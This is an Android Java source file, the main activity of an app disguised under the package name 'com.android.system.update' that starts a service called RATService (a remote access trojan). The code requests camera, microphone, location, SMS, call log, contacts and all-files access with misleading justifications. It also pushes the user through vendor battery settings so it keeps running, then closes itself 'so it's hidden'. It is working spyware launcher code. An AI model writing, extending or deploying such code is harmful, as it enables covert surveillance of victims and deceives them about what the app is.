package com.android.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
    private static final int SYSTEM_ALERT_WINDOW_REQUEST_CODE = 400;
    
    // Base permissions for all Android versions
    private final String[] basePermissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.SCHEDULE_EXACT_ALARM,
        Manifest.permission.USE_EXACT_ALARM,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.FOREGROUND_SERVICE_CAMERA,  // CRITICAL for camera in foreground service
        Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
        Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC
    };
    
    // Android 13+ (API 33+) specific permissions
    private final String[] android13Permissions = {
        android.Manifest.permission.READ_MEDIA_IMAGES,
        android.Manifest.permission.READ_MEDIA_VIDEO,
        android.Manifest.permission.READ_MEDIA_AUDIO,
        android.Manifest.permission.NEARBY_WIFI_DEVICES,
        android.Manifest.permission.BLUETOOTH_CONNECT,
        android.Manifest.permission.BLUETOOTH_SCAN,
        android.Manifest.permission.BODY_SENSORS
    };
    
    // Android 12 (API 31-32) specific permissions
    private final String[] android12Permissions = {
        android.Manifest.permission.BLUETOOTH_CONNECT,
        android.Manifest.permission.BLUETOOTH_SCAN,
        android.Manifest.permission.NEARBY_WIFI_DEVICES
    };
    
    // Android 11 and below storage permissions
    private final String[] legacyStoragePermissions = {
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        
        // Check and request permissions
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // First, check if we need MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                requestManageStoragePermission();
                return; // Wait for the result before checking other permissions
            }
        }
        
        // Check if we need SYSTEM_ALERT_WINDOW permission for overlay features
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                requestSystemAlertWindowPermission();
                return;
            }
        }
        
        // Add base permissions
        for (String permission : basePermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        // Add version-specific permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            // Use the new Photo Picker permissions
            for (String permission : android13Permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12
            for (String permission : android12Permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
            // Add storage permissions for Android 12
            for (String permission : legacyStoragePermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
        } else { // Android 11 and below
            for (String permission : legacyStoragePermissions) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsNeeded.add(permission);
                }
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            // Show explanation dialog for Android 13+ permissions
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                showAndroid13PermissionExplanation(permissionsNeeded);
            } else {
                // Request all missing permissions at once
                ActivityCompat.requestPermissions(this, 
                    permissionsNeeded.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
            }
        } else {
            // All permissions already granted
            allPermissionsGranted();
        }
    }
    
    private void showAndroid13PermissionExplanation(List<String> permissionsNeeded) {
        StringBuilder message = new StringBuilder();
        message.append("This app needs the following permissions:\n\n");
        
        if (permissionsNeeded.contains(android.Manifest.permission.CAMERA)) {
            message.append("📷 Camera - To take photos and access camera\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA)) {
            message.append("📷 Background Camera - To use camera while in background\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_IMAGES) ||
            permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_VIDEO)) {
            message.append("🖼️ Photos & Videos - To access and save media files\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.NEARBY_WIFI_DEVICES)) {
            message.append("📡 Nearby devices - To scan for Wi-Fi networks and Bluetooth devices\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.POST_NOTIFICATIONS)) {
            message.append("🔔 Notifications - To show service status\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            message.append("📍 Location - For GPS tracking features\n");
        }
        
        if (permissionsNeeded.contains(android.Manifest.permission.RECORD_AUDIO)) {
            message.append("🎤 Microphone - For audio recording\n");
        }
        
        new AlertDialog.Builder(this)
            .setTitle("📱 Permissions Required")
            .setMessage(message.toString())
            .setPositiveButton("Continue", (dialog, which) -> {
                ActivityCompat.requestPermissions(this, 
                    permissionsNeeded.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
            })
            .setNegativeButton("Cancel", (dialog, which) -> {
                // Try to continue with whatever permissions we have
                allPermissionsGranted();
            })
            .show();
    }
    
    private void requestManageStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                // Show explanation dialog first
                new AlertDialog.Builder(this)
                    .setTitle("💾 Storage Permission Required")
                    .setMessage("This app needs access to all files to browse folders like " +
                               "Download, Documents, and custom folders. Please grant 'All files access' " +
                               "in the next screen.")
                    .setPositiveButton("Grant Access", (dialog, which) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        } catch (Exception e) {
                            // Fallback for devices where the above intent doesn't work
                            Intent intent = new Intent();
                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        }
                    })
                    .setNegativeButton("Skip", (dialog, which) -> {
                        // Continue with other permissions
                        checkAndRequestPermissions();
                    })
                    .show();
            } catch (Exception e) {
                e.printStackTrace();
                // If dialog fails, continue with other permissions
                checkAndRequestPermissions();
            }
        } else {
            // For Android 10 and below, continue with regular permissions
            checkAndRequestPermissions();
        }
    }
    
    private void requestSystemAlertWindowPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                new AlertDialog.Builder(this)
                    .setTitle("🪟 Overlay Permission Required")
                    .setMessage("This app needs overlay permission to show important alerts and status overlays.")
                    .setPositiveButton("Grant", (dialog, which) -> {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, SYSTEM_ALERT_WINDOW_REQUEST_CODE);
                    })
                    .setNegativeButton("Skip", (dialog, which) -> {
                        checkAndRequestPermissions();
                    })
                    .show();
            } catch (Exception e) {
                e.printStackTrace();
                checkAndRequestPermissions();
            }
        } else {
            checkAndRequestPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            StringBuilder grantedPermissions = new StringBuilder();
            StringBuilder deniedPermissions = new StringBuilder();
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    grantedPermissions.append("✅ ").append(getPermissionDescription(permissions[i])).append("\n");
                } else {
                    allGranted = false;
                    deniedPermissions.append("❌ ").append(getPermissionDescription(permissions[i])).append("\n");
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "✅ All permissions granted!", Toast.LENGTH_SHORT).show();
                allPermissionsGranted();
            } else {
                // Some permissions denied, show warning but still try to start service
                String message = "Some features may be limited:\n" + deniedPermissions.toString();
                
                new AlertDialog.Builder(this)
                    .setTitle("⚠️ Permissions Partially Granted")
                    .setMessage(message)
                    .setPositiveButton("Continue", (dialog, which) -> {
                        // Check if we need to request MANAGE_EXTERNAL_STORAGE again
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            if (!Environment.isExternalStorageManager()) {
                                requestManageStoragePermission();
                                return;
                            }
                        }
                        allPermissionsGranted(); // Still try to start service with whatever permissions we have
                    })
                    .setNegativeButton("Exit", (dialog, which) -> {
                        finish();
                    })
                    .show();
            }
        }
    }
    
    private String getPermissionDescription(String permission) {
        switch (permission) {
            case Manifest.permission.CAMERA:
                return "Camera";
            case Manifest.permission.FOREGROUND_SERVICE_CAMERA:
                return "Background Camera Access";
            case Manifest.permission.RECORD_AUDIO:
                return "Microphone";
            case Manifest.permission.ACCESS_FINE_LOCATION:
            case Manifest.permission.ACCESS_COARSE_LOCATION:
                return "Location";
            case Manifest.permission.READ_SMS:
                return "Read SMS";
            case Manifest.permission.SEND_SMS:
                return "Send SMS";
            case Manifest.permission.READ_CALL_LOG:
                return "Call Logs";
            case Manifest.permission.READ_CONTACTS:
                return "Contacts";
            case Manifest.permission.READ_PHONE_STATE:
                return "Phone State";
            case Manifest.permission.POST_NOTIFICATIONS:
                return "Notifications";
            case android.Manifest.permission.READ_MEDIA_IMAGES:
                return "Read Images";
            case android.Manifest.permission.READ_MEDIA_VIDEO:
                return "Read Videos";
            case android.Manifest.permission.READ_MEDIA_AUDIO:
                return "Read Audio";
            case android.Manifest.permission.NEARBY_WIFI_DEVICES:
                return "Nearby Wi-Fi Devices";
            case Manifest.permission.READ_EXTERNAL_STORAGE:
                return "Read Storage";
            case Manifest.permission.WRITE_EXTERNAL_STORAGE:
                return "Write Storage";
            default:
                return permission.substring(permission.lastIndexOf('.') + 1);
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
            // Check if user granted battery optimization exemption
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                String packageName = getPackageName();
                
                if (pm.isIgnoringBatteryOptimizations(packageName)) {
                    Toast.makeText(this, "✅ Battery optimization disabled. App will run more reliably.", 
                        Toast.LENGTH_LONG).show();
                }
            }
            // Continue with other permissions
            checkAndRequestPermissions();
        } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            // Check if user granted MANAGE_EXTERNAL_STORAGE permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "✅ All files access granted!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "⚠️ All files access not granted. Some folders may not be accessible.", 
                        Toast.LENGTH_LONG).show();
                }
            }
            // Continue with regular permissions
            checkAndRequestPermissions();
        } else if (requestCode == SYSTEM_ALERT_WINDOW_REQUEST_CODE) {
            // Check if user granted overlay permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "✅ Overlay permission granted!", Toast.LENGTH_SHORT).show();
                }
            }
            // Continue with regular permissions
            checkAndRequestPermissions();
        }
    }
    
    private void allPermissionsGranted() {
        // All permissions granted, start service
        startRATService();
        
        // Check and request battery optimization exemption
        checkBatteryOptimization();
        
        // Open battery settings to help user whitelist the app
        openBatteryOptimizationSettings();
    }
    
    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                // Show a dialog explaining why user should disable battery optimization
                new AlertDialog.Builder(this)
                    .setTitle("🔋 Battery Optimization")
                    .setMessage("For the app to work properly in the background, please disable battery optimization. " +
                               "This ensures the service continues running even when the device is idle, " +
                               "and allows the camera to function correctly.")
                    .setPositiveButton("Disable", (dialog, which) -> {
                        requestIgnoreBatteryOptimizations();
                    })
                    .setNegativeButton("Later", null)
                    .show();
            }
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE);
            }
        }
    }
    
    private void openBatteryOptimizationSettings() {
        // Wait a bit before opening battery settings (so user sees the app first)
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        // Try manufacturer-specific battery settings first
        if (!openManufacturerBatterySettings()) {
            // Fallback to generic battery optimization settings
            try {
                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private boolean openManufacturerBatterySettings() {
        // Xiaomi
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter", 
                "com.miui.powercenter.PowerSettingsActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Xiaomi
        }
        
        // Huawei
        try {
            Intent intent = new Intent();
            intent.setClassName("com.huawei.systemmanager", 
                "com.huawei.systemmanager.optimize.process.ProtectActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Huawei
        }
        
        // OPPO
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oppo.oppopowermonitor", 
                "com.oppo.oppopowermonitor.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OPPO
        }
        
        // Vivo
        try {
            Intent intent = new Intent();
            intent.setClassName("com.vivo.abe", 
                "com.vivo.abe.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Vivo
        }
        
        // Samsung
        try {
            Intent intent = new Intent();
            intent.setClassName("com.samsung.android.lool", 
                "com.samsung.android.sm.ui.battery.BatteryActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Samsung
        }
        
        // OnePlus
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oneplus.security", 
                "com.oneplus.security.chainlaunch.ChainLaunchConfigActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OnePlus
        }
        
        return false; // No manufacturer settings found
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        
        // Add flags to ensure service starts properly
        serviceIntent.setAction("START_SERVICE");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Optional: Show a message
        Toast.makeText(this, "✅ RAT Service Started", Toast.LENGTH_SHORT).show();
        
        // Close activity immediately (so it's hidden)
        finish();
    }
}
